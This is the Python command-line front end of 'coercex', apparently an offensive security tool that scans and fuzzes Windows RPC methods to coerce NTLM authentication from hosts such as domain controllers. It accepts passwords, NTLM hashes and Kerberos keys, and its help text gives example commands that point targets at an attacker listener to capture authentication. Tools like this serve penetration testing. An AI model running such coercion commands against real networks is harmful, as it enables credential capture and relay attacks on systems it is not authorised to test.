"""Command-line interface for coercex.

Provides scan, coerce, and fuzz subcommands with full credential and
target specification support.
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import sys

from coercex import __version__
from coercex.methods import ALL_PROTOCOLS
from coercex.scanner import (
    Mode,
    ScanConfig,
    Scanner,
    format_results_json,
    format_results_table,
)
from coercex.utils import Credentials, Transport


def _parse_targets(target: str | None, targets_file: str | None) -> list[str]:
    """Resolve target list from CLI arguments."""
    result: list[str] = []

    if target:
        # Comma-separated or single target
        for t in target.split(","):
            t = t.strip()
            if t:
                result.append(t)

    if targets_file:
        try:
            with open(targets_file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        result.append(line)
        except FileNotFoundError:
            print(f"Error: targets file not found: {targets_file}", file=sys.stderr)
            sys.exit(1)

    return result


def _build_parser() -> argparse.ArgumentParser:
    """Build the argument parser."""
    parser = argparse.ArgumentParser(
        prog="coercex",
        description="Async NTLM authentication coercion scanner & fuzzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  # Scan a single target for all coercible methods
  coercex scan -t dc01.corp.local -u user -p pass -d corp.local

  # Coerce with listener to capture NTLM auth
  coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local

  # Scan multiple targets from file, EFSR only
  coercex scan -T targets.txt -u user -p pass --protocols MS-EFSR

  # Fuzz all path styles via WebDAV
  coercex fuzz -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport http

  # High-concurrency scan with hash auth
  coercex scan -t dc01.corp.local -u user -H aad3b435b51404ee:abc123... -d corp --concurrency 200
""",
    )
    parser.add_argument(
        "-V", "--version", action="version", version=f"coercex {__version__}"
    )

    subparsers = parser.add_subparsers(
        dest="command", required=True, help="Mode of operation"
    )

    # ── Shared arguments ─────────────────────────────────────────────
    parent = argparse.ArgumentParser(add_help=False)

    # Target
    target_group = parent.add_argument_group("target")
    target_group.add_argument("-t", "--target", help="Target host(s), comma-separated")
    target_group.add_argument(
        "-T", "--targets-file", help="File with one target per line"
    )

    # Credentials
    cred_group = parent.add_argument_group("credentials")
    cred_group.add_argument("-u", "--username", default="", help="Username")
    cred_group.add_argument("-p", "--password", default="", help="Password")
    cred_group.add_argument("-d", "--domain", default="", help="Domain")
    cred_group.add_argument(
        "-H", "--hashes", default="", help="NTLM hashes (LMHASH:NTHASH)"
    )
    cred_group.add_argument("--aes-key", default="", help="AES key for Kerberos")
    cred_group.add_argument(
        "-k", "--kerberos", action="store_true", help="Use Kerberos auth"
    )
    cred_group.add_argument(
        "--dc-host", default="", help="Domain controller hostname (for Kerberos)"
    )

    # Protocol filter
    filter_group = parent.add_argument_group("filtering")
    filter_group.add_argument(
        "--protocols",
        nargs="+",
        choices=ALL_PROTOCOLS,
        metavar="PROTO",
        help=f"Filter by protocol(s): {', '.join(ALL_PROTOCOLS)}",
    )

    # Performance
    perf_group = parent.add_argument_group("performance")
    perf_group.add_argument(
        "-c",
        "--concurrency",
        type=int,
        default=50,
        help="Max concurrent tasks (default: 50)",
    )
    perf_group.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Connection timeout in seconds (default: 5)",
    )

    # Output
    out_group = parent.add_argument_group("output")
    out_group.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Show all results, not just vulnerable",
    )
    out_group.add_argument(
        "--json", action="store_true", dest="json_output", help="Output results as JSON"
    )
    out_group.add_argument("-o", "--output-file", help="Write results to file")
    out_group.add_argument("--debug", action="store_true", help="Enable debug logging")

    # ── scan subcommand ──────────────────────────────────────────────
    subparsers.add_parser(
        "scan",
        parents=[parent],
        help="Scan targets for coercible RPC methods (no listener needed)",
        description="Scan mode: triggers RPC methods with dummy paths and classifies error codes.",
    )

    # ── coerce subcommand ────────────────────────────────────────────
    coerce_parser = subparsers.add_parser(
        "coerce",
        parents=[parent],
        help="Trigger coercion with a listener to capture NTLM auth",
        description="Coerce mode: starts a listener and confirms callbacks with correlation tokens.",
    )
    listener_group = coerce_parser.add_argument_group("listener")
    listener_group.add_argument(
        "-l",
        "--listener",
        required=True,
        help="Listener IP (attacker IP reachable by targets)",
    )
    listener_group.add_argument(
        "--http-port",
        type=int,
        default=80,
        help="HTTP listener port (default: 80)",
    )
    listener_group.add_argument(
        "--smb-port",
        type=int,
        default=445,
        help="SMB listener port (default: 445)",
    )
    listener_group.add_argument(
        "--transport",
        choices=["smb", "http"],
        default="smb",
        help="Coercion transport: smb or http/WebDAV (default: smb)",
    )
    listener_group.add_argument(
        "--callback-timeout",
        type=float,
        default=3.0,
        help="Seconds to wait for callback per attempt (default: 3.0)",
    )

    # ── fuzz subcommand ──────────────────────────────────────────────
    fuzz_parser = subparsers.add_parser(
        "fuzz",
        parents=[parent],
        help="Fuzz all path styles and transports per method",
        description="Fuzz mode: tries every path style variant for each method to find working combinations.",
    )
    fuzz_listener_group = fuzz_parser.add_argument_group("listener")
    fuzz_listener_group.add_argument(
        "-l",
        "--listener",
        required=True,
        help="Listener IP (attacker IP reachable by targets)",
    )
    fuzz_listener_group.add_argument(
        "--http-port",
        type=int,
        default=80,
        help="HTTP listener port (default: 80)",
    )
    fuzz_listener_group.add_argument(
        "--smb-port",
        type=int,
        default=445,
        help="SMB listener port (default: 445)",
    )
    fuzz_listener_group.add_argument(
        "--callback-timeout",
        type=float,
        default=3.0,
        help="Seconds to wait for callback per attempt (default: 3.0)",
    )

    return parser


def main(argv: list[str] | None = None) -> None:
    """Main entry point."""
    parser = _build_parser()
    args = parser.parse_args(argv)

    # ── Logging ──────────────────────────────────────────────────────
    level = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
        datefmt="%H:%M:%S",
        stream=sys.stderr,
    )
    # Suppress noisy impacket logging unless debug
    if not args.debug:
        logging.getLogger("impacket").setLevel(logging.WARNING)

    # ── Targets ──────────────────────────────────────────────────────
    targets = _parse_targets(args.target, args.targets_file)
    if not targets:
        parser.error("No targets specified. Use -t or -T.")

    # ── Credentials ──────────────────────────────────────────────────
    creds = Credentials(
        username=args.username,
        password=args.password,
        domain=args.domain,
        hashes=args.hashes,
        aes_key=args.aes_key,
        do_kerberos=args.kerberos,
        dc_host=args.dc_host,
    )

    # ── Build config ─────────────────────────────────────────────────
    mode = Mode[args.command.upper()]

    config = ScanConfig(
        targets=targets,
        mode=mode,
        protocols=args.protocols,
        creds=creds,
        concurrency=args.concurrency,
        timeout=args.timeout,
        verbose=args.verbose,
    )

    # Listener settings for coerce/fuzz
    if mode in (Mode.COERCE, Mode.FUZZ):
        config.listener_host = args.listener
        config.http_port = args.http_port
        config.smb_port = args.smb_port
        config.callback_timeout = args.callback_timeout

        if mode == Mode.COERCE:
            config.transport = (
                Transport.HTTP if args.transport == "http" else Transport.SMB
            )

    # ── Run ──────────────────────────────────────────────────────────
    stats = asyncio.run(_run(config))

    # ── Output results ───────────────────────────────────────────────
    if args.json_output:
        output = format_results_json(stats, show_all=args.verbose)
    else:
        output = format_results_table(stats, show_all=args.verbose)

    if args.output_file:
        with open(args.output_file, "w") as f:
            f.write(output + "\n")
        print(f"Results written to {args.output_file}", file=sys.stderr)
    else:
        print(output)


async def _run(config: ScanConfig) -> "ScanStats":
    """Async entry point for the scanner."""
    from coercex.utils import ScanStats as _ScanStats

    scanner = Scanner(config)
    return await scanner.run()


if __name__ == "__main__":
    main()
